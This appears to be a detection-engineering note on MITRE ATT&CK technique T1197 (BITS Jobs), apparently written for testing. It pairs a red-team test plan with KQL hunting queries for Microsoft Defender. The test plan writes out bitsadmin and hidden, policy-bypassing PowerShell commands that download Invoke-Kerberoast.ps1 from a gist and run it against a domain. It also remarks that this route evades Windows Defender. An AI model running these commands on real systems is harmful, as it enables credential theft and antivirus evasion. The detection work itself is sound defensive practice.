Title: BITS Jobs

Reference: https://attack.mitre.org/techniques/T1197/

Description: BitsAdmin is a built-in Windows tool that can used to download arbitary files on the internet.

NOTE: Windows Defender doesn't block it when using BitsAdmin, so you can use Bitsadmin get Invoke-Kerberoast.ps1 on a box.
If you try CertUtil for example it will be blocked immediately by Windows Defender. This has been tested on 05/03/2020

Test plan:

bitsadmin /transfer "DownloadFile" https://gist.githubusercontent.com/0xbadjuju/0ebe02983273048c237a8b24633cee3f/raw/c385a21c230ee0e274293aa4e50b5b9ed4197df2/Invoke-Kerberoast.ps1 C:\Temp\Invoke-Kerberoast.ps1
cd C:\Temp
Invoke-Kerberoast.ps1 -Domain contoso.com | fl

Test plan for Start-BitsTransfer PowerShell cmdlet"

"powershell.exe" -windowstyle hidden -ExecutionPolicy ByPass -NoProfile Start-BitsTransfer -Source https://gist.githubusercontent.com/0xbadjuju/0ebe02983273048c237a8b24633cee3f/raw/c385a21c230ee0e274293aa4e50b5b9ed4197df2/Invoke-Kerberoast.ps1 -Destination C:\Temp\Invoke-Kerberoast.ps1


KQL Query:

// T1197 - BITS Jobs
// Reference: https://attack.mitre.org/techniques/T1197/
DeviceProcessEvents
| where Timestamp >= ago(7d)
| where FolderPath == "C:\\Windows\\System32\\bitsadmin.exe" and ProcessCommandLine contains "http"
| project Timestamp, DeviceName, FolderPath, ProcessCommandLine, AccountDomain, AccountName, InitiatingProcessFolderPath, ProcessCreationTime, DeviceId, ReportId
| sort by Timestamp desc

KQL Query: (Start-BitsTransfer cmdlet)

// T1197 - BITS Jobs (PowerShell)
// Reference: https://attack.mitre.org/techniques/T1197/
let timeframe = 7d;
DeviceProcessEvents  
| where Timestamp >= ago(timeframe)
| where InitiatingProcessFileName in ("powershell.exe", "POWERSHELL.EXE", "powershell_ise.exe", "POWERSHELL_ISE.EXE") 
| where ProcessCommandLine has "Start-BitsTransfer" and ProcessCommandLine contains "http"
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountDomain, AccountName
| sort by Timestamp desc
